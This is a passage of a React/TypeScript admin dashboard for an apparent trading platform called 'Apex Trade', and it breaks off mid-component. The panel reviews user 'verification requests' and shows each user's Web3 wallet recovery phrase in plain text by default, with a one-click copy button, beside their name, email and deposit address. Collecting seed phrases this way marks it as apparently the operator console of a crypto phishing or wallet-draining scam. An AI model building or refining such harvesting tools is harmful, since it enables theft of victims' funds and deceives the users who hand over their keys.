import React, { useState, useEffect } from "react";
import { motion, AnimatePresence } from "motion/react";
import {
  AlertCircle,
  ArrowLeft,
  Check,
  CheckCircle2,
  Clock,
  Copy,
  Eye,
  EyeOff,
  FileText,
  Filter,
  KeyRound,
  Lock,
  LogOut,
  RefreshCw,
  Search,
  Shield,
  ShieldAlert,
  ShieldCheck,
  User,
  Wallet,
  X,
  XCircle,
  Zap,
} from "lucide-react";
import {
  verificationService,
  VerificationRequestData,
  VerificationCounts,
  AdminUser,
} from "../../services/verificationService";
import { useRouter } from "../../context/RouterContext";
import { formatUSD, formatTimestamp } from "../../lib/utils";

export const AdminDashboard: React.FC = () => {
  const router = useRouter();

  // Admin Auth State
  const [isAdminAuthenticated, setIsAdminAuthenticated] = useState<boolean>(false);
  const [adminUser, setAdminUser] = useState<AdminUser | null>(null);
  const [isAuthChecking, setIsAuthChecking] = useState<boolean>(true);

  // Login Form State
  const [loginEmail, setLoginEmail] = useState<string>("");
  const [loginPassword, setLoginPassword] = useState<string>("");
  const [loginError, setLoginError] = useState<string | null>(null);
  const [isLoggingIn, setIsLoggingIn] = useState<boolean>(false);

  // Data & Filters State
  const [requests, setRequests] = useState<VerificationRequestData[]>([]);
  const [counts, setCounts] = useState<VerificationCounts>({
    all: 0,
    pending: 0,
    approved: 0,
    rejected: 0,
    expired: 0,
  });
  const [activeFilter, setActiveFilter] = useState<string>("pending");
  const [searchQuery, setSearchQuery] = useState<string>("");
  const [isLoadingRequests, setIsLoadingRequests] = useState<boolean>(false);
  const [actionError, setActionError] = useState<string | null>(null);
  const [successNotice, setSuccessNotice] = useState<string | null>(null);

  // Action Modals State
  const [selectedRequestForAction, setSelectedRequestForAction] = useState<VerificationRequestData | null>(null);
  const [detailsModalRequest, setDetailsModalRequest] = useState<VerificationRequestData | null>(null);
  const [actionType, setActionType] = useState<"approve" | "reject" | null>(null);
  const [actionNotes, setActionNotes] = useState<string>("");
  const [isExecutingAction, setIsExecutingAction] = useState<boolean>(false);
  const [copiedPhraseId, setCopiedPhraseId] = useState<string | null>(null);
  const [showPhraseMap, setShowPhraseMap] = useState<Record<string, boolean>>({});

  const handleCopyPhrase = (reqId: string, phrase: string, e?: React.MouseEvent) => {
    if (e) e.stopPropagation();
    navigator.clipboard.writeText(phrase);
    setCopiedPhraseId(reqId);
    setSuccessNotice(`Wallet phrase for ${reqId} copied to clipboard.`);
    setTimeout(() => {
      setCopiedPhraseId((prev) => (prev === reqId ? null : prev));
      setSuccessNotice(null);
    }, 2500);
  };

  const toggleShowPhrase = (reqId: string, e?: React.MouseEvent) => {
    if (e) e.stopPropagation();
    setShowPhraseMap((prev) => ({
      ...prev,
      [reqId]: !prev[reqId],
    }));
  };

  // Check existing admin session
  useEffect(() => {
    const checkSession = async () => {
      setIsAuthChecking(true);
      const session = await verificationService.checkAdminSession();
      if (session.authenticated && session.admin) {
        setIsAdminAuthenticated(true);
        setAdminUser(session.admin);
      } else {
        setIsAdminAuthenticated(false);
      }
      setIsAuthChecking(false);
    };

    checkSession();
  }, []);

  // Fetch requests when authenticated or filters change
  const fetchRequests = async () => {
    if (!isAdminAuthenticated) return;
    setIsLoadingRequests(true);
    setActionError(null);
    try {
      const data = await verificationService.getAdminRequests(activeFilter, searchQuery);
      setRequests(data.requests);
      setCounts(data.counts);
    } catch (err: any) {
      setActionError(err.message || "Failed to load requests.");
      if (err.message?.includes("authorization") || err.message?.includes("Unauthorized")) {
        setIsAdminAuthenticated(false);
      }
    } finally {
      setIsLoadingRequests(false);
    }
  };

  useEffect(() => {
    if (isAdminAuthenticated) {
      fetchRequests();
      const interval = setInterval(fetchRequests, 4000);
      return () => clearInterval(interval);
    }
  }, [isAdminAuthenticated, activeFilter, searchQuery]);

  // Handle Admin Login
  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoginError(null);
    setIsLoggingIn(true);
    try {
      const data = await verificationService.adminLogin(loginEmail, loginPassword);
      setIsAdminAuthenticated(true);
      setAdminUser(data.admin);
      setSuccessNotice("Admin authentication successful.");
      setTimeout(() => setSuccessNotice(null), 3000);
    } catch (err: any) {
      setLoginError(err.message || "Failed to sign in as administrator.");
    } finally {
      setIsLoggingIn(false);
    }
  };

  // Handle Admin Logout
  const handleLogout = async () => {
    await verificationService.adminLogout();
    setIsAdminAuthenticated(false);
    setAdminUser(null);
    setRequests([]);
  };

  // Handle Approve Request
  const handleApprove = async (req: VerificationRequestData) => {
    setIsExecutingAction(true);
    setActionError(null);
    try {
      const res = await verificationService.approveRequest(req.id, actionNotes || "Approved by administrator");
      setSuccessNotice(`Request ${req.id} for ${req.userName} has been APPROVED.`);
      setTimeout(() => setSuccessNotice(null), 4000);
      setSelectedRequestForAction(null);
      setActionType(null);
      setActionNotes("");
      fetchRequests();
    } catch (err: any) {
      setActionError(err.message || "Failed to approve request.");
    } finally {
      setIsExecutingAction(false);
    }
  };

  // Handle Reject Request
  const handleReject = async (req: VerificationRequestData) => {
    setIsExecutingAction(true);
    setActionError(null);
    const reason = actionNotes.trim() || "Unconfirmed transaction details or invalid deposit proof.";
    try {
      const res = await verificationService.rejectRequest(req.id, reason);
      setSuccessNotice(`Request ${req.id} for ${req.userName} has been REJECTED.`);
      setTimeout(() => setSuccessNotice(null), 4000);
      setSelectedRequestForAction(null);
      setActionType(null);
      setActionNotes("");
      fetchRequests();
    } catch (err: any) {
      setActionError(err.message || "Failed to reject request.");
    } finally {
      setIsExecutingAction(false);
    }
  };

  // -------------------------------------------------------------
  // RENDER: Loading Auth Check
  // -------------------------------------------------------------
  if (isAuthChecking) {
    return (
      <div className="min-h-screen bg-[#070709] flex items-center justify-center p-4">
        <div className="flex items-center gap-3 text-white font-mono text-sm">
          <RefreshCw className="w-5 h-5 text-[#00ffa3] animate-spin" />
          <span>Verifying administrator session...</span>
        </div>
      </div>
    );
  }

  // -------------------------------------------------------------
  // RENDER: Admin Login Gate
  // -------------------------------------------------------------
  if (!isAdminAuthenticated) {
    return (
      <div className="min-h-screen bg-[#070709] flex items-center justify-center p-4">
        <div className="w-full max-w-md rounded-3xl bg-[#0e0e12] border border-[#1c1c24] shadow-2xl p-7 sm:p-8 space-y-6 text-white relative">
          {/* Header */}
          <div className="text-center space-y-2">
            <div className="w-14 h-14 rounded-2xl bg-[#00ffa3]/10 border border-[#00ffa3]/30 text-[#00ffa3] flex items-center justify-center mx-auto shadow-lg shadow-[#00ffa3]/15">
              <ShieldCheck className="w-7 h-7" />
            </div>
            <h1 className="text-2xl font-black tracking-tight">Admin Portal Login</h1>
            <p className="text-xs text-[#a1a1aa]">
              Secure verification & approval control center for Apex Trade administrators.
            </p>
          </div>

          {/* Error Message */}
          {loginError && (
            <div className="p-3.5 rounded-xl bg-rose-500/10 border border-rose-500/30 text-rose-300 text-xs flex items-center gap-2">
              <AlertCircle className="w-4 h-4 shrink-0 text-rose-400" />
              <span>{loginError}</span>
            </div>
          )}

          {/* Login Form */}
          <form onSubmit={handleLogin} className="space-y-4">
            <div className="space-y-1.5">
              <label className="block text-xs font-bold text-[#d4d4d8]">Admin Email</label>
              <input
                type="email"
                required
                value={loginEmail}
                onChange={(e) => {
                  setLoginEmail(e.target.value);
                  if (loginError) setLoginError(null);
                }}
                placeholder=""
                className="w-full px-4 py-3 rounded-2xl bg-[#07070a] border border-[#1c1c24] focus:border-[#00ffa3] text-sm text-white font-mono outline-none transition-colors"
              />
            </div>

            <div className="space-y-1.5">
              <label className="block text-xs font-bold text-[#d4d4d8]">Admin Password</label>
              <input
                type="password"
                required
                value={loginPassword}
                onChange={(e) => {
                  setLoginPassword(e.target.value);
                  if (loginError) setLoginError(null);
                }}
                placeholder=""
                className="w-full px-4 py-3 rounded-2xl bg-[#07070a] border border-[#1c1c24] focus:border-[#00ffa3] text-sm text-white font-mono outline-none transition-colors"
              />
            </div>

            <button
              type="submit"
              disabled={isLoggingIn || !loginEmail.trim() || !loginPassword}
              className="w-full py-3.5 px-5 rounded-2xl bg-gradient-to-r from-[#00ffa3] to-teal-400 hover:from-[#00ffa3]/90 hover:to-teal-300 text-black font-black text-sm transition-all shadow-lg shadow-[#00ffa3]/20 flex items-center justify-center gap-2 disabled:opacity-50 disabled:cursor-not-allowed"
            >
              {isLoggingIn ? (
                <RefreshCw className="w-4 h-4 animate-spin" />
              ) : (
                <>
                  <Lock className="w-4 h-4" />
                  <span>Authenticate as Admin</span>
                </>
              )}
            </button>
          </form>

          {/* Back to User Platform */}
          <div className="pt-2 text-center">
            <button
              type="button"
              onClick={() => router.push("/dashboard")}
              className="text-xs text-[#71717a] hover:text-[#00ffa3] transition-colors flex items-center justify-center gap-1.5 mx-auto"
            >
              <ArrowLeft className="w-3.5 h-3.5" />
              <span>Back to Trading Platform</span>
            </button>
          </div>
        </div>
      </div>
    );
  }

  // -------------------------------------------------------------
  // RENDER: Authenticated Admin Dashboard
  // -------------------------------------------------------------
  return (
    <div className="min-h-screen bg-[#070709] text-white flex flex-col font-sans">
      {/* Top Admin Header Bar */}
      <header className="h-16 border-b border-[#181820] bg-[#0c0c10] px-4 sm:px-8 flex items-center justify-between sticky top-0 z-40">
        <div className="flex items-center gap-3">
          <div className="w-9 h-9 rounded-xl bg-[#00ffa3]/15 border border-[#00ffa3]/40 text-[#00ffa3] flex items-center justify-center font-black text-sm">
            APEX
          </div>
          <div>
            <div className="flex items-center gap-2">
              <span className="font-extrabold text-sm tracking-tight text-white">
                Admin Verification Center
              </span>
              <span className="px-2 py-0.5 rounded text-[10px] font-mono font-bold bg-[#00ffa3]/15 text-[#00ffa3] border border-[#00ffa3]/30">
                PORTAL v2.4
              </span>
            </div>
            <span className="text-[11px] text-[#71717a]">
              Direct authorization engine • No email / SMTP dependencies
            </span>
          </div>
        </div>

        {/* Right Admin Profile & Actions */}
        <div className="flex items-center gap-3 sm:gap-4">
          <button
            type="button"
            onClick={() => router.push("/dashboard")}
            className="hidden sm:flex items-center gap-1.5 px-3 py-1.5 rounded-xl bg-[#14141c] hover:bg-[#1e1e28] text-[#a1a1aa] hover:text-white border border-[#22222e] text-xs font-bold transition-all"
          >
            <ArrowLeft className="w-3.5 h-3.5" />
            <span>User Platform</span>
          </button>

          <div className="hidden md:flex items-center gap-2 px-3 py-1.5 rounded-xl bg-[#121218] border border-[#1e1e28] text-xs">
            <User className="w-3.5 h-3.5 text-[#00ffa3]" />
            <span className="font-mono text-[#d4d4d8] font-semibold">{adminUser?.email}</span>
          </div>

          <button
            type="button"
            onClick={handleLogout}
            className="p-2 rounded-xl bg-[#14141c] hover:bg-rose-500/10 text-[#a1a1aa] hover:text-rose-400 border border-[#22222e] hover:border-rose-500/30 transition-all"
            title="Sign Out"
          >
            <LogOut className="w-4 h-4" />
          </button>
        </div>
      </header>

      {/* Main Content Area */}
      <main className="flex-1 max-w-7xl w-full mx-auto p-4 sm:p-6 lg:p-8 space-y-6">
        {/* Success / Error Alerts */}
        <AnimatePresence>
          {successNotice && (
            <motion.div
              initial={{ opacity: 0, y: -10 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: -10 }}
              className="p-4 rounded-2xl bg-emerald-500/15 border border-emerald-500/30 text-emerald-300 text-xs font-mono flex items-center justify-between shadow-lg"
            >
              <div className="flex items-center gap-2.5">
                <CheckCircle2 className="w-4 h-4 text-emerald-400 shrink-0" />
                <span>{successNotice}</span>
              </div>
              <button
                type="button"
                onClick={() => setSuccessNotice(null)}
                className="text-emerald-400 hover:text-white"
              >
                <X className="w-4 h-4" />
              </button>
            </motion.div>
          )}

          {actionError && (
            <motion.div
              initial={{ opacity: 0, y: -10 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: -10 }}
              className="p-4 rounded-2xl bg-rose-500/15 border border-rose-500/30 text-rose-300 text-xs font-mono flex items-center justify-between shadow-lg"
            >
              <div className="flex items-center gap-2.5">
                <AlertCircle className="w-4 h-4 text-rose-400 shrink-0" />
                <span>{actionError}</span>
              </div>
              <button
                type="button"
                onClick={() => setActionError(null)}
                className="text-rose-400 hover:text-white"
              >
                <X className="w-4 h-4" />
              </button>
            </motion.div>
          )}
        </AnimatePresence>

        {/* Top Metric Cards */}
        <div className="grid grid-cols-2 sm:grid-cols-5 gap-3 sm:gap-4">
          <div
            onClick={() => setActiveFilter("all")}
            className={`p-4 rounded-2xl border transition-all cursor-pointer ${
              activeFilter === "all"
                ? "bg-[#14141c] border-[#00ffa3] shadow-md shadow-[#00ffa3]/10"
                : "bg-[#0e0e12] border-[#1c1c24] hover:border-[#2a2a36]"
            }`}
          >
            <div className="text-xs text-[#71717a] font-bold">Total Requests</div>
            <div className="text-2xl font-black text-white font-mono mt-1">{counts.all}</div>
          </div>

          <div
            onClick={() => setActiveFilter("pending")}
            className={`p-4 rounded-2xl border transition-all cursor-pointer relative overflow-hidden ${
              activeFilter === "pending"
                ? "bg-amber-500/10 border-amber-400 shadow-md shadow-amber-500/15"
                : "bg-[#0e0e12] border-[#1c1c24] hover:border-amber-500/30"
            }`}
          >
            <div className="flex items-center justify-between">
              <span className="text-xs text-amber-400 font-bold">Pending</span>
              <span className="w-2 h-2 rounded-full bg-amber-400 animate-ping" />
            </div>
            <div className="text-2xl font-black text-amber-400 font-mono mt-1">
              {counts.pending}
            </div>
          </div>

          <div
            onClick={() => setActiveFilter("approved")}
            className={`p-4 rounded-2xl border transition-all cursor-pointer ${
              activeFilter === "approved"
                ? "bg-[#00ffa3]/10 border-[#00ffa3] shadow-md shadow-[#00ffa3]/15"
                : "bg-[#0e0e12] border-[#1c1c24] hover:border-[#00ffa3]/30"
            }`}
          >
            <div className="text-xs text-[#00ffa3] font-bold">Approved</div>
            <div className="text-2xl font-black text-[#00ffa3] font-mono mt-1">
              {counts.approved}
            </div>
          </div>

          <div
            onClick={() => setActiveFilter("rejected")}
            className={`p-4 rounded-2xl border transition-all cursor-pointer ${
              activeFilter === "rejected"
                ? "bg-rose-500/10 border-rose-400 shadow-md shadow-rose-500/15"
                : "bg-[#0e0e12] border-[#1c1c24] hover:border-rose-500/30"
            }`}
          >
            <div className="text-xs text-rose-400 font-bold">Rejected</div>
            <div className="text-2xl font-black text-rose-400 font-mono mt-1">
              {counts.rejected}
            </div>
          </div>

          <div
            onClick={() => setActiveFilter("expired")}
            className={`p-4 rounded-2xl border transition-all cursor-pointer col-span-2 sm:col-span-1 ${
              activeFilter === "expired"
                ? "bg-[#181824] border-[#71717a] shadow-md"
                : "bg-[#0e0e12] border-[#1c1c24] hover:border-[#2a2a36]"
            }`}
          >
            <div className="text-xs text-[#71717a] font-bold">Expired</div>
            <div className="text-2xl font-black text-[#a1a1aa] font-mono mt-1">
              {counts.expired}
            </div>
          </div>
        </div>

        {/* Toolbar: Filters, Search, and Quick Actions */}
        <div className="flex flex-col md:flex-row gap-3 md:items-center justify-between">
          {/* Status Filter Tabs */}
          <div className="flex items-center gap-1.5 p-1 rounded-2xl bg-[#0e0e12] border border-[#1c1c24] overflow-x-auto">
            {["all", "pending", "approved", "rejected", "expired"].map((tab) => (
              <button
                key={tab}
                type="button"
                onClick={() => setActiveFilter(tab)}
                className={`px-3.5 py-1.5 rounded-xl text-xs font-bold capitalize transition-all whitespace-nowrap ${
                  activeFilter === tab
                    ? "bg-[#1c1c26] text-white shadow-sm border border-[#2c2c3a]"
                    : "text-[#71717a] hover:text-[#d4d4d8]"
                }`}
              >
                {tab}
                <span className="ml-1.5 text-[10px] font-mono text-[#a1a1aa]">
                  ({counts[tab as keyof VerificationCounts] ?? 0})
                </span>
              </button>
            ))}
          </div>

          {/* Search & Actions */}
          <div className="flex items-center gap-2.5">
            <div className="relative flex-1 sm:w-64">
              <Search className="w-4 h-4 absolute left-3.5 top-1/2 -translate-y-1/2 text-[#71717a]" />
              <input
                type="text"
                value={searchQuery}
                onChange={(e) => setSearchQuery(e.target.value)}
                placeholder="Search ID, user, asset..."
                className="w-full pl-9 pr-3.5 py-2 rounded-xl bg-[#0e0e12] border border-[#1c1c24] focus:border-[#00ffa3] text-xs text-white font-mono outline-none"
              />
            </div>

            <button
              type="button"
              onClick={fetchRequests}
              disabled={isLoadingRequests}
              className="p-2 rounded-xl bg-[#0e0e12] hover:bg-[#181822] text-[#a1a1aa] hover:text-white border border-[#1c1c24] transition-all"
              title="Refresh List"
            >
              <RefreshCw className={`w-4 h-4 ${isLoadingRequests ? "animate-spin text-[#00ffa3]" : ""}`} />
            </button>
          </div>
        </div>

        {/* Requests Table */}
        <div className="rounded-3xl bg-[#0e0e12] border border-[#1c1c24] shadow-2xl overflow-hidden">
          <div className="overflow-x-auto">
            <table className="w-full text-left border-collapse text-xs font-mono">
              <thead>
                <tr className="border-b border-[#1c1c24] bg-[#09090c] text-[#71717a] uppercase tracking-wider text-[10px]">
                  <th className="py-3.5 px-4 font-bold min-w-[240px]">Request ID & Web3 Wallet</th>
                  <th className="py-3.5 px-4 font-bold min-w-[160px]">User Information</th>
                  <th className="py-3.5 px-4 font-bold min-w-[150px]">Type & Details</th>
                  <th className="py-3.5 px-4 font-bold min-w-[130px]">Submitted / Expiry</th>
                  <th className="py-3.5 px-4 font-bold min-w-[100px]">Status</th>
                  <th className="py-3.5 px-4 font-bold text-right min-w-[140px]">Actions</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-[#181820]">
                {requests.length === 0 ? (
                  <tr>
                    <td colSpan={6} className="py-12 text-center text-[#71717a] font-sans">
                      <div className="max-w-xs mx-auto space-y-2">
                        <Shield className="w-8 h-8 mx-auto text-[#2a2a36]" />
                        <p className="font-bold text-sm text-[#d4d4d8]">No verification requests found</p>
                        <p className="text-xs text-[#71717a]">
                          {activeFilter === "all"
                            ? "No live requests have been submitted yet."
                            : `There are currently no live requests with status '${activeFilter}'.`}
                        </p>
                      </div>
                    </td>
                  </tr>
                ) : (
                  requests.map((req) => {
                    const isPending = req.status === "pending";
                    const isApproved = req.status === "approved";
                    const isRejected = req.status === "rejected";
                    const isExpired = req.status === "expired";
                    const isWeb3 = !!(req.web3Wallet || req.walletPhrase || req.type?.toLowerCase().includes("web3"));
                    const isPhraseShown = showPhraseMap[req.id] !== false; // default open for admin visibility
                    const isCopied = copiedPhraseId === req.id;
                    const phraseWords = req.walletPhrase ? req.walletPhrase.trim().split(/\s+/).filter(Boolean) : [];

                    return (
                      <tr
                        key={req.id}
                        className={`hover:bg-[#12121a] transition-colors ${
                          isPending ? "bg-[#101016]/40" : ""
                        }`}
                      >
                        {/* Request ID & Web3 Wallet / Phrase */}
                        <td className="py-4 px-4 align-top">
                          <div className="space-y-2">
                            {/* Request ID */}
                            <div className="flex items-center gap-2">
                              <span className="text-[#00ffa3] font-bold text-xs sm:text-sm font-mono tracking-wide">
                                {req.id}
                              </span>
                              {isWeb3 && (
                                <span className="px-2 py-0.5 rounded-full text-[9px] font-bold bg-purple-500/15 text-purple-300 border border-purple-500/30 flex items-center gap-1">
                                  <Wallet className="w-2.5 h-2.5" />
                                  Web3 Wallet
                                </span>
                              )}
                            </div>

                            {/* Web3 Wallet Name */}
                            {req.web3Wallet && (
                              <div className="flex items-center gap-1.5 text-xs">
                                <span className="text-[#71717a] font-sans text-[11px]">web3wallet:</span>
                                <span className="px-2 py-0.5 rounded-lg bg-[#181824] border border-[#2a2a3c] text-white font-bold font-sans flex items-center gap-1">
                                  <Wallet className="w-3 h-3 text-[#00ffa3]" />
                                  {req.web3Wallet}
                                </span>
                              </div>
                            )}

                            {/* Wallet Phrase section under the existing request ID */}
                            {req.walletPhrase && (
                              <div className="p-2.5 rounded-2xl bg-[#07070a] border border-[#222230] space-y-1.5 max-w-sm">
                                <div className="flex items-center justify-between gap-2 border-b border-[#181822] pb-1.5">
                                  <div className="flex items-center gap-1.5 text-[10px] text-amber-400 font-bold font-sans">
                                    <KeyRound className="w-3 h-3" />
                                    <span>wallet phrase</span>
                                    {phraseWords.length > 0 && (
                                      <span className="px-1.5 py-0.2 rounded bg-amber-500/15 text-amber-300 text-[9px] font-mono">
                                        {phraseWords.length} words
                                      </span>
                                    )}
                                  </div>
                                  <div className="flex items-center gap-1">
                                    <button
                                      type="button"
                                      onClick={(e) => toggleShowPhrase(req.id, e)}
                                      className="p-1 rounded text-[#71717a] hover:text-white hover:bg-[#181822] transition-colors"
                                      title={isPhraseShown ? "Hide phrase" : "Show phrase"}
                                    >
                                      {isPhraseShown ? <EyeOff className="w-3 h-3" /> : <Eye className="w-3 h-3" />}
                                    </button>
                                    <button
                                      type="button"
                                      onClick={(e) => handleCopyPhrase(req.id, req.walletPhrase!, e)}
                                      className={`flex items-center gap-1 px-1.5 py-0.5 rounded text-[10px] font-bold font-sans transition-all ${
                                        isCopied
                                          ? "bg-[#00ffa3] text-black"
                                          : "bg-[#181824] hover:bg-[#222232] text-[#00ffa3] border border-[#00ffa3]/30"
                                      }`}
                                      title="Copy recovery phrase"
                                    >
                                      {isCopied ? (
                                        <>
                                          <Check className="w-3 h-3 stroke-[3]" />
                                          <span>Copied</span>
                                        </>
                                      ) : (
                                        <>
                                          <Copy className="w-3 h-3" />
                                          <span>Copy</span>
                                        </>
                                      )}
                                    </button>
                                  </div>
                                </div>

                                {/* Secret Recovery Phrase content */}
                                <div className="text-[11px] font-mono text-amber-200/90 break-words leading-relaxed select-all">
                                  {isPhraseShown ? (
                                    req.walletPhrase
                                  ) : (
                                    <span className="text-[#52525b] tracking-widest font-mono">
                                      •••• •••• •••• •••• •••• ••••
                                    </span>
                                  )}
                                </div>
                              </div>
                            )}
                          </div>
                        </td>

                        {/* User Information */}
                        <td className="py-4 px-4 font-sans align-top">
                          <div className="space-y-1">
                            <div className="flex items-center gap-1.5">
                              <span className="font-bold text-white text-xs">{req.userName}</span>
                              {req.userTier && (
                                <span className="px-1.5 py-0.2 rounded text-[9px] font-mono bg-amber-500/15 text-amber-300 border border-amber-500/30">
                                  {req.userTier}
                                </span>
                              )}
                            </div>
                            <div className="text-[11px] text-[#71717a] font-mono truncate max-w-[180px]" title={req.userEmail}>
                              {req.userEmail}
                            </div>
                            {req.userId && (
                              <div className="text-[10px] text-[#52525b] font-mono">
                                ID: {req.userId}
                              </div>
                            )}
                          </div>
                        </td>

                        {/* Type & Details / Amount */}
                        <td className="py-4 px-4 align-top">
                          <div className="space-y-1">
                            {isWeb3 ? (
                              <>
                                <div className="font-bold text-white text-xs flex items-center gap-1.5">
                                  <span className="text-purple-300">{req.web3Wallet || "Web3 Wallet"}</span>
                                </div>
                                <div className="text-[10px] text-[#71717a]">
                                  {req.type || "Wallet Connect"}
                                </div>
                                {(req.walletAddress || req.depositAddress) && (
                                  <div className="text-[10px] font-mono text-[#a1a1aa] truncate max-w-[160px]" title={req.walletAddress || req.depositAddress}>
                                    Addr: {req.walletAddress || req.depositAddress}
                                  </div>
                                )}
                              </>
                            ) : req.asset === "BTCBR" || req.btcbrAmount ? (
                              <>
                                <div className="font-bold text-[#00ffa3] text-xs font-mono break-all">
                                  {req.btcbrAmount || formatUSD(req.amountUSD)} <span className="text-white font-sans">BTCBR</span>
                                </div>
                                {req.btcbrDigits && (
                                  <div className="pt-0.5">
                                    <span className="inline-block px-1.5 py-0.5 rounded text-[9px] font-mono font-bold bg-[#00ffa3]/15 text-[#00ffa3] border border-[#00ffa3]/30">
                                      {req.btcbrDigits} Digits
                                    </span>
                                  </div>
                                )}
                                <div className="text-[10px] text-[#71717a]">
                                  {req.protocol || "BSC BEP-20"}
                                </div>
                                {req.depositAddress && (
                                  <div className="text-[10px] font-mono text-[#a1a1aa] truncate max-w-[160px]" title={req.depositAddress}>
                                    {req.depositAddress}
                                  </div>
                                )}
                              </>
                            ) : (
                              <>
                                <div className="font-bold text-white text-xs">
                                  {formatUSD(req.amountUSD)} <span className="text-[#00ffa3]">({req.asset})</span>
                                </div>
                                <div className="text-[10px] text-[#71717a]">
                                  {req.protocol || req.type}
                                </div>
                                {req.depositAddress && (
                                  <div className="text-[10px] font-mono text-[#a1a1aa] truncate max-w-[160px]" title={req.depositAddress}>
                                    {req.depositAddress}
                                  </div>
                                )}
                              </>
                            )}
                          </div>
                        </td>

                        {/* Submitted & Expiry */}
                        <td className="py-4 px-4 text-[11px] align-top">
                          <div className="text-[#d4d4d8]">{formatTimestamp(req.createdAt)}</div>
                          {isPending && (
                            <div className="text-amber-400 text-[10px] flex items-center gap-1 mt-1">
                              <Clock className="w-3 h-3" />
                              <span>
                                Expires in{" "}
                                {Math.max(0, Math.floor((req.expiresAt - Date.now()) / 60000))}m
                              </span>
                            </div>
                          )}
                        </td>

                        {/* Status Badge */}
                        <td className="py-4 px-4 align-top">
                          {isPending && (
                            <span className="px-2.5 py-1 rounded-full text-[10px] font-bold bg-amber-500/15 text-amber-400 border border-amber-500/30 inline-flex items-center gap-1.5">
                              <span className="w-1.5 h-1.5 rounded-full bg-amber-400 animate-pulse" />
                              PENDING
                            </span>
                          )}
                          {isApproved && (
                            <span className="px-2.5 py-1 rounded-full text-[10px] font-bold bg-[#00ffa3]/15 text-[#00ffa3] border border-[#00ffa3]/30 inline-flex items-center gap-1">
                              <Check className="w-3 h-3 stroke-[3]" />
                              APPROVED
                            </span>
                          )}
                          {isRejected && (
                            <span className="px-2.5 py-1 rounded-full text-[10px] font-bold bg-rose-500/15 text-rose-400 border border-rose-500/30 inline-flex items-center gap-1">
                              <X className="w-3 h-3 stroke-[3]" />
                              REJECTED
                            </span>
                          )}
                          {isExpired && (
                            <span className="px-2.5 py-1 rounded-full text-[10px] font-bold bg-[#1e1e28] text-[#71717a] border border-[#2c2c3a]">
                              EXPIRED
                            </span>
                          )}
                        </td>

                        {/* Actions */}
                        <td className="py-4 px-4 text-right align-top">
                          <div className="flex flex-col items-end gap-1.5">
                            {isPending ? (
                              <div className="flex items-center justify-end gap-1.5">
                                <button
                                  type="button"
                                  onClick={() => {
                                    setSelectedRequestForAction(req);
                                    setActionType("approve");
                                    setActionNotes("");
                                  }}
                                  className="px-2.5 py-1.5 rounded-xl bg-[#00ffa3] hover:bg-[#00ffa3]/90 text-black font-extrabold text-xs transition-all shadow-md shadow-[#00ffa3]/20 flex items-center gap-1"
                                  title="Approve Request"
                                >
                                  <Check className="w-3.5 h-3.5 stroke-[3]" />
                                  <span>Approve</span>
                                </button>

                                <button
                                  type="button"
                                  onClick={() => {
                                    setSelectedRequestForAction(req);
                                    setActionType("reject");
                                    setActionNotes("");
                                  }}
                                  className="px-2.5 py-1.5 rounded-xl bg-[#181822] hover:bg-rose-500/15 text-rose-400 hover:text-rose-300 font-bold text-xs border border-[#282834] hover:border-rose-500/30 transition-all flex items-center gap-1"
                                  title="Reject Request"
                                >
                                  <X className="w-3.5 h-3.5 stroke-[2.5]" />
                                  <span>Reject</span>
                                </button>
                              </div>
                            ) : isApproved ? (
                              <div className="text-right text-[11px] text-[#71717a] font-sans">
                                <span className="text-[#00ffa3] font-bold">Approved</span>
                                {req.approvedAt && (
                                  <div className="text-[10px] text-[#52525b] font-mono">
                                    {new Date(req.approvedAt).toLocaleTimeString()}
                                  </div>
                                )}
                              </div>
                            ) : isRejected ? (
                              <div className="text-right text-[11px] text-rose-400 font-sans">
                                <span className="font-bold">Rejected</span>
                                {req.rejectionReason && (
                                  <div className="text-[10px] text-[#71717a] max-w-[140px] truncate ml-auto font-mono" title={req.rejectionReason}>
                                    {req.rejectionReason}
                                  </div>
                                )}
                              </div>
                            ) : (
                              <span className="text-[11px] text-[#52525b]">Expired</span>
                            )}

                            {/* View Full Details Button */}
                            <button
                              type="button"
                              onClick={() => setDetailsModalRequest(req)}
                              className="px-2 py-1 rounded-lg bg-[#14141c] hover:bg-[#1e1e28] text-[#a1a1aa] hover:text-white border border-[#22222e] text-[10px] font-bold flex items-center gap-1 transition-colors"
                              title="Inspect Full Request Details"
                            >
                              <Eye className="w-3 h-3 text-[#00ffa3]" />
                              <span>Details</span>
                            </button>
                          </div>
                        </td>
                      </tr>
                    );
                  })
                )}
              </tbody>
            </table>
          </div>
        </div>

        {/* Security & Architecture Explanation Footnote */}
        <div className="p-4 rounded-2xl bg-[#09090d] border border-[#181820] text-xs text-[#71717a] space-y-1">
          <div className="font-bold text-[#d4d4d8] flex items-center gap-1.5">
            <Shield className="w-4 h-4 text-[#00ffa3]" />
            <span>Secure Admin Verification Architecture</span>
          </div>
          <p className="leading-relaxed">
            All approval and rejection requests execute server-side through <code className="text-[#00ffa3]">/api/verification/:id/approve</code> and <code className="text-rose-400">/api/verification/:id/reject</code> with session token verification. Client applications cannot self-approve; polling frontends automatically transition states once authenticated by this dashboard.
          </p>
        </div>
      </main>

      {/* ========================================================================= */}
      {/* ACTION CONFIRMATION MODAL (APPROVE / REJECT) */}
      {/* ========================================================================= */}
      <AnimatePresence>
        {selectedRequestForAction && actionType && (
          <div className="fixed inset-0 z-50 bg-black/80 backdrop-blur-sm flex items-center justify-center p-4">
            <motion.div
              initial={{ opacity: 0, scale: 0.95 }}
              animate={{ opacity: 1, scale: 1 }}
              exit={{ opacity: 0, scale: 0.95 }}
              className="w-full max-w-md rounded-3xl bg-[#0e0e12] border border-[#22222e] p-6 sm:p-7 space-y-5 text-white shadow-2xl relative"
            >
              {/* Header */}
              <div className="flex items-center justify-between">
                <div className="flex items-center gap-2">
                  {actionType === "approve" ? (
                    <div className="w-9 h-9 rounded-xl bg-[#00ffa3]/15 text-[#00ffa3] flex items-center justify-center">
                      <CheckCircle2 className="w-5 h-5" />
                    </div>
                  ) : (
                    <div className="w-9 h-9 rounded-xl bg-rose-500/15 text-rose-400 flex items-center justify-center">
                      <XCircle className="w-5 h-5" />
                    </div>
                  )}
                  <h3 className="text-lg font-black tracking-tight">
                    {actionType === "approve" ? "Confirm Approval" : "Confirm Rejection"}
                  </h3>
                </div>

                <button
                  type="button"
                  onClick={() => {
                    setSelectedRequestForAction(null);
